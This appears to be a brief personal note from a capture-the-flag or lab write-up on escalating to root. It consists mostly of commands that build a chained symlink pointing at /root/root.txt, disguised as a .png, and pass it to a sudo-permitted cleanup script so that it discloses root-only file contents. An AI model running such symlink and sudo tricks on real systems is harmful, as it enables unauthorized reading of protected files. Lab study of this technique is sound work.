escalete privilege to root

we have sudo no pass for file
![[Pasted image 20250123133054.png]]


ln -s /root/root.txt 1.txt
ln -s /home/bob/1.txt 1.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/1.png